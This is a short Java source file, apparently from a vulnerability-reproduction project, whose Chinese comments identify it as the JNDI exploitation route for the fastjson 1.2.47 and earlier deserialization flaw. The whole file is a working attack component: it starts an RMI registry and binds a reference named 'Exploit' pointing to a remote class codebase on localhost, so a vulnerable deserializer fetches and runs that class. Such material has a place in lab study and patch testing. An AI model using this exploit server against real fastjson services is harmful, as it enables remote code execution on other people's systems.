package com.xianyue.leakbug.fastjson;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;

/**
 * @author liuhongjun
 * @since 2019-07-16
 *
 * fastjson =< 1.2.47 反序列化漏洞
 *
 * 1。 jndi利用方式
 */
public class RmiService {

    // rmi 服务器
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1098);
        Reference reference = new Reference("Exploit",
            "Exploit", "http://localhost:8125/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }

}
